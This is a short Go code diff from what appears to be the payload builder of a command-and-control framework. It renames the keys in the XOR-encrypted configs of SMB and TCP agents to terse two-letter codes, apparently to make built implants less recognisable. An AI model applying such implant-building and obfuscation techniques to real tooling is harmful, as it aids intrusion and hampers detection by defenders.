@@ -510,9 +510,9 @@ func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *liste
 		// Create encrypted config for SMB agent (same as WebSocket service)
 		// The config is XOR encrypted with the PLAIN secret
 		smbConfig := map[string]string{
-			"Pipe Name":  req.PipeName,
-			"Secret":     secret,
-			"Public Key": keyPair.PublicKeyPEM,
+			"pn": req.PipeName,
+			"sk": secret,
+			"pk": keyPair.PublicKeyPEM,
 		}
 		configJSON, _ := json.Marshal(smbConfig)
 
@@ -540,9 +540,9 @@ func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *liste
 		// Create encrypted config for TCP agent (same pattern as SMB)
 		// The config is XOR encrypted with the PLAIN secret
 		tcpConfig := map[string]string{
-			"TCP Port":   tcpPort,
-			"Secret":     secret,
-			"Public Key": keyPair.PublicKeyPEM,
+			"tp": tcpPort,
+			"sk": secret,
+			"pk": keyPair.PublicKeyPEM,
 		}
 		configJSON, _ := json.Marshal(tcpConfig)
 
